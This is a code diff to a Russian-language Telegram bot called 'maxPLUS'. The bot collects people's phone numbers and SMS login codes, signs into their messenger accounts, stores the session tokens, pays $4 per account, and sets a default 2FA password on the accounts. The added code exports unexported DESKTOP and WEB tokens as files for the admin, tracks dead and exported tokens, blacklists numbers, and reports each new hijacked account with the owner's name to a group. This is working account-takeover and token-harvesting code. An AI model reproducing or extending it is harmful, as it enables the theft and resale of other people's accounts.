@@ -2,6 +2,8 @@ import asyncio
 import os
 import asyncpg
 import logging
+from datetime import datetime
+from zoneinfo import ZoneInfo
 from aiogram import Bot, Dispatcher, F
 from aiogram.filters import Command
 from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
@@ -25,6 +27,7 @@ ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
 DATABASE_URL = os.getenv("DATABASE_URL")
 DEFAULT_2FA_PASSWORD = os.getenv("PASS", "")
 CRYPTO_BOT_TOKEN = os.getenv("CRYPTO2", "")
+APPROVED_GROUP_ID = int(os.getenv("GROUP_ID", 0))
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
@@ -34,6 +37,7 @@ expecting_phone = set()
 expecting_balance_clear = set()
 db_pool = None
 crypto = AioCryptoPay(token=CRYPTO_BOT_TOKEN, network=Networks.MAIN_NET) if CRYPTO_BOT_TOKEN else None
+blacklisted_numbers = set()
 
 # === TelegramSmsProvider ===
 class TelegramSmsProvider:
@@ -61,6 +65,7 @@ async def init_db():
                 phone TEXT PRIMARY KEY,
                 token TEXT NOT NULL,
                 alive BOOLEAN DEFAULT TRUE,
+                exported BOOLEAN DEFAULT FALSE,
                 created_at TIMESTAMP DEFAULT NOW()
             )
         """)
@@ -87,12 +92,29 @@ async def save_token_to_db(phone: str, token: str):
 
 async def get_all_tokens():
     async with db_pool.acquire() as conn:
-        rows = await conn.fetch("SELECT phone, token, alive FROM tokens")
-        return [{"phone": r["phone"], "token": r["token"], "alive": r["alive"]} for r in rows]
+        rows = await conn.fetch("SELECT phone, token, alive, exported FROM tokens")
+        return [{"phone": r["phone"], "token": r["token"], "alive": r["alive"], "exported": r["exported"]} for r in rows]
+
+async def get_token_by_phone(phone: str):
+    async with db_pool.acquire() as conn:
+        row = await conn.fetchrow("SELECT phone, token, alive FROM tokens WHERE phone = $1", phone)
+        return {"phone": row["phone"], "token": row["token"], "alive": row["alive"]} if row else None
 
 async def update_token_status(phone: str, alive: bool):
     async with db_pool.acquire() as conn:
         await conn.execute("UPDATE tokens SET alive = $1 WHERE phone = $2", alive, phone)
+
+async def mark_tokens_exported(phone_list: list[str]):
+    async with db_pool.acquire() as conn:
+        await conn.execute("UPDATE tokens SET exported = TRUE WHERE phone = ANY($1)", phone_list)
+
+async def reset_exported():
+    async with db_pool.acquire() as conn:
+        await conn.execute("UPDATE tokens SET exported = FALSE")
+
+async def delete_dead_tokens():
+    async with db_pool.acquire() as conn:
+        await conn.execute("DELETE FROM tokens WHERE alive = FALSE")
 
 # === Баланс пользователя ===
 async def get_user_balance(user_id: int) -> float:
@@ -249,8 +271,20 @@ async def stats_cmd(msg: Message):
         return
 
     tokens = await get_all_tokens()
-    total_tokens = len(tokens)
-    alive_tokens = sum(1 for t in tokens if t["alive"])
+
+    desktop_total = len(tokens)
+    desktop_alive = sum(1 for t in tokens if t["alive"])
+    desktop_unexported = sum(1 for t in tokens if not t["exported"])
+
+    web_tokens = []
+    for t in tokens:
+        web_token = read_token_from_session(f"web_{t['phone']}")
+        if web_token:
+            web_tokens.append(t)
+
+    web_total = len(web_tokens)
+    web_alive = sum(1 for t in web_tokens if t["alive"])
+    web_unexported = sum(1 for t in web_tokens if not t["exported"])
 
     async with db_pool.acquire() as conn:
         user_count = await conn.fetchval("SELECT COUNT(*) FROM users")
@@ -268,15 +302,20 @@ async def stats_cmd(msg: Message):
 
     text = (
         f"📊 <b>Статистика maxPLUS</b>\n\n"
-        f"👥 Пользователей: {user_count or 0}\n"
-        f"🔑 Авторизовано: {total_tokens} (живых: {alive_tokens})\n\n"
+        f"👥 Пользователей: {user_count or 0}\n\n"
+        f"🔑 <b>DESKTOP:</b> {desktop_total} (живых: {desktop_alive}) | не выгружено: {desktop_unexported}\n"
+        f"🔑 <b>WEB:</b> {web_total} (живых: {web_alive}) | не выгружено: {web_unexported}\n\n"
         f"💰 <b>Баланс казны:</b>\n{treasury_text}"
     )
 
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="Выгрузить WEB", callback_data="export_web"),
-            InlineKeyboardButton(text="Выгрузить DESKTOP", callback_data="export_desktop")
+            InlineKeyboardButton(text=f"Выгрузить DESKTOP ({desktop_unexported})", callback_data="export_desktop"),
+            InlineKeyboardButton(text=f"Выгрузить WEB ({web_unexported})", callback_data="export_web")
+        ],
+        [
+            InlineKeyboardButton(text="Сбросить выгрузку", callback_data="reset_export"),
+            InlineKeyboardButton(text="Очистить мёртвые", callback_data="clear_dead")
         ],
         [
             InlineKeyboardButton(text="Чистка балансов", callback_data="clear_balance")
@@ -370,17 +409,19 @@ async def withdraw_callback(callback: CallbackQuery):
 @dp.callback_query(lambda c: c.data == "export_web")
 async def export_web_callback(callback: CallbackQuery):
     tokens = await get_all_tokens()
+    unexported = [t for t in tokens if not t["exported"]]
 
-    if not tokens:
-        await callback.answer("Нет токенов для выгрузки", show_alert=True)
+    if not unexported:
+        await callback.answer("Нет невыгруженных токенов", show_alert=True)
         return
 
-    await callback.message.answer(f"⏳ Конвертирую все токены в WEB ({len(tokens)} шт.)...")
+    await callback.message.answer(f"⏳ Конвертирую и выгружаю WEB-токены ({len(unexported)} шт.)...")
 
     converted = 0
     web_tokens_list = []
+    exported_phones = []
 
-    for t in tokens:
+    for t in unexported:
         phone = t["phone"]
         token = t["token"]
         try:
@@ -394,10 +435,14 @@ async def export_web_callback(callback: CallbackQuery):
             if web_token:
                 await save_token_to_db(phone, web_token)
                 web_tokens_list.append(f"{phone} — {web_token}")
+                exported_phones.append(phone)
                 converted += 1
                 logger.info(f"Converted {phone} -> WEB")
         except Exception as e:
             logger.warning(f"Failed to convert {phone}: {e}")
+
+    if exported_phones:
+        await mark_tokens_exported(exported_phones)
 
     if not web_tokens_list:
         await callback.message.answer("❌ Не удалось конвертировать ни один токен")
@@ -413,16 +458,31 @@ async def export_web_callback(callback: CallbackQuery):
 @dp.callback_query(lambda c: c.data == "export_desktop")
 async def export_desktop_callback(callback: CallbackQuery):
     tokens = await get_all_tokens()
-    desktop_list = [f"{t['phone']} — {t['token']}" for t in tokens]
+    unexported = [t for t in tokens if not t["exported"]]
 
-    if not desktop_list:
-        await callback.answer("Нет DESKTOP-токенов для выгрузки", show_alert=True)
+    if not unexported:
+        await callback.answer("Нет невыгруженных токенов", show_alert=True)
         return
+
+    desktop_list = [f"{t['phone']} — {t['token']}" for t in unexported]
+    await mark_tokens_exported([t["phone"] for t in unexported])
 
     from io import BytesIO
     file = BytesIO("\n".join(desktop_list).encode())
     file.name = "desktop_tokens.txt"
     await callback.message.answer_document(file, caption=f"DESKTOP-токены ({len(desktop_list)} шт.)")
+    await callback.answer()
+
+@dp.callback_query(lambda c: c.data == "reset_export")
+async def reset_export_callback(callback: CallbackQuery):
+    await reset_exported()
+    await callback.message.answer("✅ Счётчик выгрузки сброшен. Все токены доступны для выгрузки.")
+    await callback.answer()
+
+@dp.callback_query(lambda c: c.data == "clear_dead")
+async def clear_dead_callback(callback: CallbackQuery):
+    await delete_dead_tokens()
+    await callback.message.answer("✅ Мёртвые токены удалены из базы.")
     await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "clear_balance")
@@ -517,6 +577,15 @@ async def main_handler(msg: Message):
         else:
             phone = "+7" + digits
 
+        # Проверка блокировки номера
+        if phone in blacklisted_numbers:
+            return await msg.answer("❌ Слишком много попыток авторизации для этого номера")
+
+        # Проверка на уже авторизованный номер
+        existing = await get_token_by_phone(phone)
+        if existing and existing["alive"]:
+            return await msg.answer("📲 Этот номер уже был авторизован ранее, повторная авторизация не требуется")
+
         logger.info(f"User {msg.from_user.id} — запрос SMS на номер {phone}")
 
         sms_provider = TelegramSmsProvider()
@@ -558,6 +627,12 @@ async def run_client(msg: Message, client: Client, phone: str, sms_provider: Tel
         if token:
             await save_token_to_db(phone, token)
 
+        # Защита от двойных начислений
+        existing = await get_token_by_phone(phone)
+        if existing and existing["alive"]:
+            await msg.answer("📲 Этот номер уже был авторизован ранее, повторное начисление не выполнено")
+            return
+
         await add_to_balance(msg.from_user.id, 4.0)
 
         logger.info(f"User {msg.from_user.id} — номер {phone} успешно авторизован")
@@ -565,6 +640,25 @@ async def run_client(msg: Message, client: Client, phone: str, sms_provider: Tel
             "📲 Номер успешно авторизован, на ваш баланс зачислено \\$4\\.00",
             parse_mode="MarkdownV2"
         )
+
+        # Уведомление в одобренную группу
+        if APPROVED_GROUP_ID:
+            try:
+                profile = client.me
+                display_name = "Неизвестно"
+                if profile and profile.contact:
+                    first = profile.contact.first_name or ""
+                    last = profile.contact.last_name or ""
+                    display_name = f"{first} {last}".strip() or "Неизвестно"
+                msk_time = datetime.now(ZoneInfo("Europe/Moscow")).strftime("%d.%m.%Y, %H:%M")
+                await bot.send_message(
+                    APPROVED_GROUP_ID,
+                    f"📲 Новая авторизация: {phone}\n"
+                    f"👤 Профиль: {display_name}\n"
+                    f"🕐 Дата (МСК): {msk_time}"
+                )
+            except Exception:
+                pass
 
         if DEFAULT_2FA_PASSWORD:
             await asyncio.sleep(15)
@@ -585,6 +679,7 @@ async def run_client(msg: Message, client: Client, phone: str, sms_provider: Tel
         elif "blocked" in error_text or "recovery" in error_text:
             await msg.answer("❌ Номер заблокирован или удалён. Восстановлению не подлежит, используйте другой номер")
         elif "limit" in error_text or "violate" in error_text or "слишком много попыток" in error_text:
+            blacklisted_numbers.add(phone)
             await msg.answer("❌ Слишком много попыток авторизации для этого номера")
         elif "auth" in error_name or "code" in error_text or "token" in error_text:
             await msg.answer("❌ Неверный код подтверждения. Проверьте правильность ввода и повторите попытку")
